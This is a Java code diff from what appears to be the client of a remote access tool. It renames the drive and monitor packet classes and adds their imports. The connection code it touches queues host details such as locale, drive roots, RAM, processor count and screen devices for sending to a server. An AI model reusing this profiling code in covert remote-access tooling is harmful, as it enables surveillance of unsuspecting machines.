@@ -33,6 +33,8 @@ import com.redpois0n.packets.outgoing.Packet28InitLanAddress;
 import com.redpois0n.packets.outgoing.Packet30InitVersion;
 import com.redpois0n.packets.outgoing.Packet31InitInstallationDate;
 import com.redpois0n.packets.outgoing.Packet47InitCountry;
+import com.redpois0n.packets.outgoing.Packet61InitMonitors;
+import com.redpois0n.packets.outgoing.Packet62InitDrives;
 import com.redpois0n.packets.outgoing.Packet63InitRAM;
 import com.redpois0n.packets.outgoing.Packet64InitAvailableProcessors;
 import com.sun.management.OperatingSystemMXBean;
@@ -145,13 +147,13 @@ public class Connection implements Runnable {
 
 		addToSendQueue(new Packet10InitDefaultLocale(Locale.getDefault()));
 
-		addToSendQueue(new Packet62Drives(File.listRoots()));
+		addToSendQueue(new Packet62InitDrives(File.listRoots()));
 
 		addToSendQueue(new Packet63InitRAM((short) (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L)));
 
 		addToSendQueue(new Packet64InitAvailableProcessors(Runtime.getRuntime().availableProcessors()));
 
-		addToSendQueue(new Packet61Monitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));
+		addToSendQueue(new Packet61InitMonitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));
 	}
 
 	public static void addToSendQueue(AbstractOutgoingPacket packet) {
